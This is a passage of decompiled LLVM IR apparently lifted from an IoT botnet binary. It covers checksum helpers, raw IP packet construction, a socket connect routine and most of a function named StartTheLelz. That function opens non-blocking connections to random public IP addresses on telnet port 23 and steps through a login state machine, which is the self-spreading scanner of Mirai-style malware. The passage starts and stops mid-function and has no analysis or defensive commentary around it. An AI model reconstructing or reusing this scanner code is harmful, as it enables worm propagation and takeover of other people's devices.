  %v3_dc2c = udiv i32 %v2_dc10, 65536
  %v2_dc30 = or i32 %v3_dc24, %v3_dc2c
  %v3_dc38 = udiv i32 %v5_dc14, 65536
  %v2_dc40 = or i32 %v2_dc30, %v3_dc38
  %v2_dc44 = icmp eq i32 %v2_dc40, 0
  br i1 %v2_dc44, label %dec_label_pc_dc20.dec_label_pc_dc4c_crit_edge, label %dec_label_pc_dbd0

dec_label_pc_dc20.dec_label_pc_dc4c_crit_edge:    ; preds = %dec_label_pc_dbd0
  br label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc20.dec_label_pc_dc4c_crit_edge, %dec_label_pc_dc20.preheader
  %v3_dc4c.lcssa = phi i32 [ %v2_dc10, %dec_label_pc_dc20.dec_label_pc_dc4c_crit_edge ], [ %v3_dc4c.ph, %dec_label_pc_dc20.preheader ]
  %v1_dc58 = urem i32 %v3_dc4c.lcssa, 65536
  %v3_dc60 = xor i32 %v1_dc58, 65535
  ret i32 %v3_dc60

; uselistorder directives
  uselistorder i32 %v2_dc30, { 1, 0 }
  uselistorder i32 %v5_dc14, { 1, 0 }
  uselistorder i32 %v2_dc10, { 2, 0, 3, 1 }
  uselistorder i32 %v3_dc3840, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_dc4c.ph, { 2, 1, 0 }
  uselistorder i32 %v2_dbb8, { 0, 2, 1 }
  uselistorder i32 %v1_db84, { 0, 2, 1 }
  uselistorder i32 %v2_db64, { 0, 2, 1 }
  uselistorder i32 %v2_db60, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_dbd0, { 1, 0 }
  uselistorder label %dec_label_pc_db4c, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dc78 = load i32, i32* @fp, align 4
  store i32 56448, i32* %stack_var_-4, align 4
  %v2_dc7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dc7c, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_dc9c = add i32 %arg1, 12
  %v2_dc9c = inttoptr i32 %v1_dc9c to i32*
  %v3_dc9c = load i32, i32* %v2_dc9c, align 4
  store i32 %v3_dc9c, i32* %stack_var_-44, align 4
  %v1_dcc4 = call i32 @__GI_htons(i32 20)
  %v1_dce0 = call i32 @malloc(i32 32)
  %v2_dcec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_dcec, i32* @r3, align 4
  store i32 %v1_dce0, i32* @r0, align 4
  store i32 %v2_dcec, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_dcfc = call i32 @memcpy()
  %v1_dd04 = add i32 %v1_dce0, 12
  store i32 %v1_dd04, i32* @r3, align 4
  store i32 %v1_dd04, i32* @r0, align 4
  %v3_dd0c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_dd0c, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_dd14 = call i32 @memcpy()
  %v2_dd20 = inttoptr i32 %v1_dce0 to i16*
  %v3_dd20 = call i32 @csum(i16* %v2_dd20, i32 32)
  %sext = mul i32 %v3_dd20, 65536
  %v1_dd24 = sdiv i32 %sext, 65536
  store i32 %v1_dce0, i32* @r0, align 4
  %v0_dd30 = call i32 @free()
  %v4_dd34 = urem i32 %v1_dd24, 65536
  store i32 %v3_dc78, i32* @fp, align 4
  ret i32 %v4_dd34

; uselistorder directives
  uselistorder i32 %v1_dce0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dd4c = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_ddb8 = add i32 %tmp4, 1
  %v4_ddb8 = inttoptr i32 %v3_ddb8 to i8*
  store i8 0, i8* %v4_ddb8, align 1
  %v3_ddbc = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ddbc, 20
  %v1_ddd8 = trunc i32 %fold to i16
  %v3_ddd8 = add i32 %tmp4, 2
  %v4_ddd8 = inttoptr i32 %v3_ddd8 to i16*
  store i16 %v1_ddd8, i16* %v4_ddd8, align 2
  %v0_dddc = call i32 @rand_cmwc()
  %v1_ddf0 = trunc i32 %v0_dddc to i16
  %v3_ddf0 = add i32 %tmp4, 4
  %v4_ddf0 = inttoptr i32 %v3_ddf0 to i16*
  store i16 %v1_ddf0, i16* %v4_ddf0, align 2
  %v3_ddfc = add i32 %tmp4, 6
  %v4_ddfc = inttoptr i32 %v3_ddfc to i16*
  store i16 0, i16* %v4_ddfc, align 2
  %v3_de08 = add i32 %tmp4, 8
  %v4_de08 = inttoptr i32 %v3_de08 to i8*
  store i8 -1, i8* %v4_de08, align 1
  %v3_de14 = add i32 %tmp4, 9
  %v4_de14 = inttoptr i32 %v3_de14 to i8*
  store i8 %tmp, i8* %v4_de14, align 1
  %v3_de20 = add i32 %tmp4, 10
  %v4_de20 = inttoptr i32 %v3_de20 to i16*
  store i16 0, i16* %v4_de20, align 2
  %v2_de2c = add i32 %tmp4, 12
  %v3_de2c = inttoptr i32 %v2_de2c to i32*
  store i32 %arg3, i32* %v3_de2c, align 4
  %v2_de38 = add i32 %tmp4, 16
  %v3_de38 = inttoptr i32 %v2_de38 to i32*
  store i32 %arg2, i32* %v3_de38, align 4
  store i32 %v3_dd4c, i32* @fp, align 4
  ret i32 %v0_dddc

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 0, 4 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_de64 = icmp sgt i32 %arg1, 2
  br i1 %v8_de64, label %dec_label_pc_de74, label %dec_label_pc_de84

dec_label_pc_de74:                                ; preds = %entry
  %v1_de78 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %entry, %dec_label_pc_de74
  %storemerge1 = phi i32 [ 0, %dec_label_pc_de74 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_de84, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_de9c = load i32, i32* @fp, align 4
  store i32 56996, i32* %stack_var_-4, align 4
  %v2_dea0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dea0, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_dec0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_ded0 = icmp eq i32 %v1_dec0, 0
  br i1 %v2_ded0, label %dec_label_pc_ded8, label %dec_label_pc_dee4

dec_label_pc_ded8:                                ; preds = %entry
  br label %dec_label_pc_dfb0

dec_label_pc_dee4:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_dee8 = add i32 %v1_dec0, 16
  %v2_dee8 = inttoptr i32 %v1_dee8 to i32*
  %v3_dee8 = load i32, i32* %v2_dee8, align 4
  %v1_deec = inttoptr i32 %v3_dee8 to i32*
  %v2_deec = load i32, i32* %v1_deec, align 4
  %v1_def4 = add i32 %v1_dec0, 12
  %v2_def4 = inttoptr i32 %v1_def4 to i32*
  %v3_def4 = load i32, i32* %v2_def4, align 4
  store i32 %v3_def4, i32* @r2, align 4
  %v2_df00 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_df00, i32* @r3, align 4
  %v5_df0c = call i32 @bcopy(i32 %v2_deec, i32 %v2_df00, i32 %v3_def4, i32 %v2_df00, i32 %v1_dec0)
  %v2_df18 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_df38 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_df44 = ptrtoint i32* %stack_var_-44 to i32
  %v5_df60 = call i32 @__GI_setsockopt(i32 %v3_df38, i32 6, i32 1, i32 %v2_df44, i32 4)
  %v3_df68 = icmp eq i32 %v3_df38, -1
  br i1 %v3_df68, label %dec_label_pc_df70, label %dec_label_pc_df7c

dec_label_pc_df70:                                ; preds = %dec_label_pc_dee4
  br label %dec_label_pc_dfb0

dec_label_pc_df7c:                                ; preds = %dec_label_pc_dee4
  %v2_defc = ptrtoint i32* %stack_var_-40 to i32
  %v3_df8c = call i32 @__libc_connect(i32 %v3_df38, i32 %v2_defc, i32 16)
  %v3_df94 = icmp eq i32 %v3_df8c, -1
  br i1 %v3_df94, label %dec_label_pc_df9c, label %dec_label_pc_dfa8

dec_label_pc_df9c:                                ; preds = %dec_label_pc_df7c
  br label %dec_label_pc_dfb0

dec_label_pc_dfa8:                                ; preds = %dec_label_pc_df7c
  br label %dec_label_pc_dfb0

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_df9c, %dec_label_pc_df70, %dec_label_pc_ded8, %dec_label_pc_dfa8
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_ded8 ], [ 0, %dec_label_pc_df70 ], [ 0, %dec_label_pc_df9c ], [ %v3_df38, %dec_label_pc_dfa8 ]
  store i32 %v3_de9c, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_dfb0, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_dfc4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_dfc4, i32* %ip.global-to-local, align 4
  %v3_dfc8 = load i32, i32* @r4, align 4
  store i32 %v3_dfc8, i32* %stack_var_-24, align 4
  store i32 57296, i32* %stack_var_-4, align 4
  %v19_dfc8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_dfcc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dfcc, i32* @fp, align 4
  %v2_dfe8 = call i32 @__GI_time(i32* null)
  store i32 %v2_dfe8, i32* @r4, align 4
  %v0_dff4 = call i32 @rand_cmwc()
  %v0_dffc = load i32, i32* @r4, align 4
  %v2_dffc = xor i32 %v0_dffc, %v0_dff4
  %v1_e004 = call i32 @srand(i32 %v2_dffc)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e020 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_e050 = bitcast i32* %stack_var_-604 to i8*
  %v3_e050 = call i32 @__GI_memset(i8* %v2_e050, i32 0)
  %v1_e05c = call i32 @malloc(i32 513)
  store i32 513, i32* @r2, align 4
  %v2_e078 = inttoptr i32 %v1_e05c to i8*
  %v3_e078 = call i32 @__GI_memset(i8* %v2_e078, i32 0)
  %v2_e088 = mul i32 %arg2, 28
  %v1_e090 = add i32 %v2_e088, 14
  %v3_e094 = and i32 %v1_e090, -8
  %v1_e09c = load i32, i32* @sp, align 4
  %v2_e09c = sub i32 %v1_e09c, %v3_e094
  %v1_e0ac = add i32 %v2_e09c, 15
  %v3_e0b0 = and i32 %v1_e0ac, -8
  %v2_e0d4 = mul i32 %arg2, 5
  store i32 %v2_e0d4, i32* @r2, align 4
  %v2_e0e4 = inttoptr i32 %v3_e0b0 to i8*
  %v3_e0e4 = call i32 @__GI_memset(i8* %v2_e0e4, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_e18456 = icmp sgt i32 %arg2, 0
  br i1 %v5_e18456, label %dec_label_pc_e0f4, label %dec_label_pc_e188

dec_label_pc_e0f4:                                ; preds = %entry, %dec_label_pc_e0f4
  %storemerge457 = phi i32 [ %v1_e170, %dec_label_pc_e0f4 ], [ 0, %entry ]
  %v2_e104 = mul i32 %storemerge457, 28
  %v2_e108 = add i32 %v2_e104, %v3_e0b0
  store i32 28, i32* @r2, align 4
  %v2_e118 = inttoptr i32 %v2_e108 to i8*
  %v3_e118 = call i32 @__GI_memset(i8* %v2_e118, i32 0)
  %v3_e140 = add i32 %v2_e108, 9
  %v4_e140 = inttoptr i32 %v3_e140 to i8*
  store i8 1, i8* %v4_e140, align 1
  %v2_e160 = add i32 %v2_e108, 24
  %v2_e168 = inttoptr i32 %v2_e160 to i32*
  store i32 %v1_e05c, i32* %v2_e168, align 4
  %v1_e170 = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_e170, i32* %r2.global-to-local, align 4
  %v5_e184 = icmp slt i32 %v1_e170, %arg2
  br i1 %v5_e184, label %dec_label_pc_e0f4, label %dec_label_pc_e188

dec_label_pc_e188:                                ; preds = %dec_label_pc_e0f4, %entry
  br label %dec_label_pc_e190

dec_label_pc_e190:                                ; preds = %dec_label_pc_e190, %dec_label_pc_e188
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_e188 ], [ %v1_e194, %dec_label_pc_e190 ]
  %v1_e194 = add i32 %stack_var_-56.0, 1
  store i32 %v1_e194, i32* %r2.global-to-local, align 4
  %v4_e1a4 = mul i32 %v1_e194, 4
  %v5_e1a4 = add i32 %v4_e1a4, ptrtoint ([10 x i8*]* @global_var_29680.487 to i32)
  %v6_e1a4 = inttoptr i32 %v5_e1a4 to i32*
  %v7_e1a4 = load i32, i32* %v6_e1a4, align 4
  %v2_e1a8 = icmp eq i32 %v7_e1a4, 0
  br i1 %v2_e1a8, label %dec_label_pc_e1b0.preheader, label %dec_label_pc_e190

dec_label_pc_e1b0.preheader:                      ; preds = %dec_label_pc_e190
  %v2_e238 = add i32 %v3_e0b0, 8
  %v2_e538 = or i32 %v3_e0b0, 4
  %v2_e618 = ptrtoint i32* %stack_var_-612 to i32
  %v2_e698 = ptrtoint i32* %stack_var_-324 to i32
  %v2_e794 = ptrtoint i32* %stack_var_-332 to i32
  %v2_e7f0 = ptrtoint i32* %stack_var_-340 to i32
  %v2_e7f4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_e910 = add i32 %v3_e0b0, 16
  %v2_e98c = add i32 %v3_e0b0, 24
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e1b0, %dec_label_pc_f30c, %dec_label_pc_e1b0.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_e18456, label %dec_label_pc_e1bc, label %dec_label_pc_e1b0

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e1b0, %dec_label_pc_f30c
  %storemerge548 = phi i32 [ %v1_f310, %dec_label_pc_f30c ], [ 0, %dec_label_pc_e1b0 ]
  %v3_e1c8 = mul i32 %storemerge548, 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e1d0 = mul i32 %storemerge548, 28
  %v2_e1d4 = add i32 %v2_e1d0, %v3_e0b0
  %v2_e1d8 = add i32 %v2_e1d4, 16
  %v1_e1dc = inttoptr i32 %v2_e1d8 to i32*
  %v2_e1dc = load i32, i32* %v1_e1dc, align 4
  %v2_e1e0 = icmp eq i32 %v2_e1dc, 0
  br i1 %v2_e1e0, label %dec_label_pc_e1e8, label %dec_label_pc_e220

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1bc
  store i32 %storemerge548, i32* @r4, align 4
  %v2_e1f0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_e204 = load i32, i32* @r4, align 4
  %v3_e208 = mul i32 %v0_e204, 4
  store i32 %v3_e208, i32* %r2.global-to-local, align 4
  %v2_e210 = mul i32 %v0_e204, 28
  %v2_e218 = add i32 %v2_e910, %v2_e210
  %v2_e21c = inttoptr i32 %v2_e218 to i32*
  store i32 %v2_e1f0, i32* %v2_e21c, align 4
  br label %dec_label_pc_e220

dec_label_pc_e220:                                ; preds = %dec_label_pc_e1bc, %dec_label_pc_e1e8
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e23c = add i32 %v2_e238, %v2_e1d0
  %v1_e240 = inttoptr i32 %v2_e23c to i8*
  %v2_e240 = load i8, i8* %v1_e240, align 4
  %v3_e240 = sext i8 %v2_e240 to i32
  switch i32 %v3_e240, label %dec_label_pc_f30c [
    i32 0, label %dec_label_pc_e270
    i32 1, label %dec_label_pc_e6ac.lr.ph
    i32 2, label %dec_label_pc_e958
    i32 3, label %dec_label_pc_eaa4
    i32 4, label %dec_label_pc_ebf8
    i32 5, label %dec_label_pc_ed44
    i32 6, label %dec_label_pc_ee98
    i32 7, label %dec_label_pc_f19c
  ]

dec_label_pc_e270:                                ; preds = %dec_label_pc_e220
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e28c = add i32 %v2_e1d4, 8
  %v1_e290 = add i32 %v2_e1d4, 9
  %v2_e290 = inttoptr i32 %v1_e290 to i8*
  %v3_e290 = load i8, i8* %v2_e290, align 1
  %v7_e294 = icmp eq i8 %v3_e290, 1
  br i1 %v7_e294, label %dec_label_pc_e29c, label %dec_label_pc_e348

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e270
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e2b8 = add i32 %v2_e1d4, 24
  %v1_e2bc = inttoptr i32 %v2_e2b8 to i32*
  %v2_e2bc = load i32, i32* %v1_e2bc, align 4
  store i32 28, i32* @r2, align 4
  %v2_e2e8 = inttoptr i32 %v2_e1d4 to i8*
  %v3_e2e8 = call i32 @__GI_memset(i8* %v2_e2e8, i32 0)
  store i32 %v2_e2b8, i32* %r2.global-to-local, align 4
  store i32 %v2_e2bc, i32* %v1_e2bc, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_e318 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_e0b0, i32 %v2_e2b8, i32 %v2_e2bc)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_e328 = load i32, i32* @r4, align 4
  %v3_e32c = mul i32 %v0_e328, 4
  store i32 %v3_e32c, i32* %r2.global-to-local, align 4
  %v2_e334 = mul i32 %v0_e328, 28
  %v2_e33c = add i32 %v2_e538, %v2_e334
  %v2_e340 = inttoptr i32 %v2_e33c to i32*
  store i32 %v4_e318, i32* %v2_e340, align 4
  br label %dec_label_pc_e4d4

dec_label_pc_e348:                                ; preds = %dec_label_pc_e270
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e368 = load i8, i8* %v2_e290, align 1
  %v2_e36c = icmp eq i8 %v3_e368, 0
  br i1 %v2_e36c, label %dec_label_pc_e374, label %dec_label_pc_e4d4

dec_label_pc_e374:                                ; preds = %dec_label_pc_e348
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_e398 = add i32 %v2_e1d4, 11
  %v2_e398 = inttoptr i32 %v1_e398 to i8*
  %v3_e398 = load i8, i8* %v2_e398, align 1
  %v1_e39c = add i8 %v3_e398, 1
  store i8 %v1_e39c, i8* %v2_e398, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_e3f0 = add i32 %v2_e1d4, 10
  %v2_e3f0 = inttoptr i32 %v1_e3f0 to i8*
  %v3_e3f0 = load i8, i8* %v2_e3f0, align 2
  %v1_e3f4 = add i8 %v3_e3f0, 1
  store i32 %v3_e0b0, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_e3f4, i8* %v2_e3f0, align 2
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e444 = load i8, i8* %v2_e398, align 1
  %v7_e448 = icmp eq i8 %v3_e444, 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v7_e448, label %dec_label_pc_e450, label %dec_label_pc_e47c

dec_label_pc_e450:                                ; preds = %dec_label_pc_e374
  store i32 %v2_e28c, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e290, align 1
  br label %dec_label_pc_f30c

dec_label_pc_e47c:                                ; preds = %dec_label_pc_e374
  %v3_e49c = load i8, i8* %v2_e3f0, align 2
  %v7_e4a0 = icmp eq i8 %v3_e49c, 4
  br i1 %v7_e4a0, label %dec_label_pc_e4a8, label %dec_label_pc_e4d4

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e47c
  store i32 %v2_e28c, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_e290, align 1
  br label %dec_label_pc_f30c

dec_label_pc_e4d4:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e348, %dec_label_pc_e29c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_e4ec = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_e51c = call i32 @__GI_memset(i8* %v2_e050, i32 0)
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e558 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_e560 = load i32, i32* @r4, align 4
  %v2_e56c = mul i32 %v0_e560, 28
  %v2_e570 = add i32 %v2_e56c, %v3_e0b0
  %v2_e574 = inttoptr i32 %v2_e570 to i32*
  store i32 %v3_e558, i32* %v2_e574, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_e590 = inttoptr i32 %v2_e1d4 to i32*
  %v2_e590 = load i32, i32* %v1_e590, align 4
  %v7_e594 = icmp eq i32 %v2_e590, -1
  br i1 %v7_e594, label %dec_label_pc_f30c, label %dec_label_pc_e59c

dec_label_pc_e59c:                                ; preds = %dec_label_pc_e4d4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e5b4 = load i32, i32* %v1_e590, align 4
  store i32 %v2_e5b4, i32* @r4, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e5d0 = load i32, i32* %v1_e590, align 4
  store i32 %v2_e5d0, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e5e0 = call i32 @__libc_fcntl(i32 %v2_e5d0, i32 3)
  %v1_e5e8 = or i32 %v2_e5e0, 2048
  store i32 %v1_e5e8, i32* @r3, align 4
  %v0_e5ec = load i32, i32* @r4, align 4
  store i32 %v1_e5e8, i32* %r2.global-to-local, align 4
  %v2_e5f8 = call i32 @__libc_fcntl(i32 %v0_e5ec, i32 4)
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e614 = load i32, i32* %v1_e590, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e628 = call i32 @__libc_connect(i32 %v2_e614, i32 %v2_e618, i32 16)
  %v3_e630 = icmp eq i32 %v3_e628, -1
  br i1 %v3_e630, label %dec_label_pc_e638, label %dec_label_pc_e670

dec_label_pc_e638:                                ; preds = %dec_label_pc_e59c
  %v0_e638 = call i32 @__GI___errno_location()
  %v1_e640 = inttoptr i32 %v0_e638 to i32*
  %v2_e640 = load i32, i32* %v1_e640, align 4
  %v7_e644 = icmp eq i32 %v2_e640, 115
  br i1 %v7_e644, label %dec_label_pc_e670, label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e638
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e668 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_e670:                                ; preds = %dec_label_pc_e59c, %dec_label_pc_e638
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e690 = call i32 @advance_state(i32* nonnull %v1_e590, i32 1)
  br label %dec_label_pc_f30c

dec_label_pc_e6ac.lr.ph:                          ; preds = %dec_label_pc_e220
  br label %dec_label_pc_e6ac

dec_label_pc_e6ac:                                ; preds = %dec_label_pc_e6ac.lr.ph, %dec_label_pc_e6ac
  %storemerge610 = phi i32 [ 0, %dec_label_pc_e6ac.lr.ph ], [ %v1_e6c0, %dec_label_pc_e6ac ]
  store i32 %v2_e698, i32* %r2.global-to-local, align 4
  %v5_e6b8 = mul nuw nsw i32 %storemerge610, 4
  %v6_e6b8 = add i32 %v5_e6b8, %v2_e698
  %v7_e6b8 = inttoptr i32 %v6_e6b8 to i32*
  store i32 0, i32* %v7_e6b8, align 4
  %v1_e6c0 = add nuw nsw i32 %storemerge610, 1
  %tmp39 = icmp ult i32 %v1_e6c0, 32
  br i1 %tmp39, label %dec_label_pc_e6ac, label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6ac
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v1_e6ec = inttoptr i32 %v2_e1d4 to i32*
  %v2_e6ec = load i32, i32* %v1_e6ec, align 4
  %v3_e6f0 = udiv i32 %v2_e6ec, 32
  %v3_e704 = mul nuw nsw i32 %v3_e6f0, 4
  %v2_e70c = add i32 %v3_e704, %v19_dfc8
  store i32 %v2_e70c, i32* %r2.global-to-local, align 4
  %v2_e710 = add i32 %v2_e70c, -300
  %v1_e714 = inttoptr i32 %v2_e710 to i32*
  %v2_e714 = load i32, i32* %v1_e714, align 4
  store i32 %v2_e714, i32* %ip.global-to-local, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e730 = load i32, i32* %v1_e6ec, align 4
  %v1_e734 = urem i32 %v2_e730, 32
  %v6_e73c = shl i32 1, %v1_e734
  %v2_e740 = or i32 %v6_e73c, %v2_e714
  store i32 %v2_e740, i32* %v1_e714, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e788 = load i32, i32* %v1_e6ec, align 4
  %v1_e78c = add i32 %v2_e788, 1
  store i32 %v1_e78c, i32* %r2.global-to-local, align 4
  store i32 %v2_e698, i32* %ip.global-to-local, align 4
  %v1_e798 = load i32, i32* @sp, align 4
  %v2_e798 = inttoptr i32 %v1_e798 to i32*
  store i32 %v2_e794, i32* %v2_e798, align 4
  %v0_e79c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e698, i32* %r2.global-to-local, align 4
  %v4_e7ac = load i32, i32* %stack_var_-332, align 4
  %v5_e7ac = call i32 @__libc_select(i32 %v0_e79c, i32 0, i32 %v2_e698, i32 0, i32 %v4_e7ac)
  %v7_e7bc = icmp eq i32 %v5_e7ac, 1
  br i1 %v7_e7bc, label %dec_label_pc_e7c4, label %dec_label_pc_e8c8

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e6d4
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e7ec = load i32, i32* %v1_e6ec, align 4
  store i32 %v2_e7ec, i32* %r2.global-to-local, align 4
  store i32 %v2_e7f0, i32* %ip.global-to-local, align 4
  %v1_e7f8 = load i32, i32* @sp, align 4
  %v2_e7f8 = inttoptr i32 %v1_e7f8 to i32*
  store i32 %v2_e7f4, i32* %v2_e7f8, align 4
  %v0_e7fc = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e80c = load i32, i32* %stack_var_-340, align 4
  %v5_e80c = call i32 @getsockopt(i32 %v0_e7fc, i32 1, i32 4, i32 %v2_e7f0, i32 %v4_e80c)
  %v3_e810 = load i32, i32* %stack_var_-340, align 4
  %v2_e814 = icmp eq i32 %v3_e810, 0
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  br i1 %v2_e814, label %dec_label_pc_e840, label %dec_label_pc_e81c

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e7c4
  %v3_e838 = call i32 @reset_telstate(i32 %v2_e1d4, i32 %v3_e0b0, i32 %v3_e1c8)
  br label %dec_label_pc_f30c

dec_label_pc_e840:                                ; preds = %dec_label_pc_e7c4
  %v2_e858 = load i32, i32* %v1_e6ec, align 4
  store i32 %v2_e858, i32* @r4, align 4
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v2_e874 = load i32, i32* %v1_e6ec, align 4
  store i32 %v2_e874, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e884 = call i32 @__libc_fcntl(i32 %v2_e874, i32 3)
  %v1_e88c = and i32 %v2_e884, -2049
  store i32 %v1_e88c, i32* @r3, align 4
  %v0_e890 = load i32, i32* @r4, align 4
  store i32 %v1_e88c, i32* %r2.global-to-local, align 4
  %v2_e89c = call i32 @__libc_fcntl(i32 %v0_e890, i32 4)
  store i32 %v3_e1c8, i32* %r2.global-to-local, align 4
  %v3_e8c0 = call i32 @advance_state(i32* nonnull %v1_e6ec, i32 2)
  br label %dec_label_pc_f30c

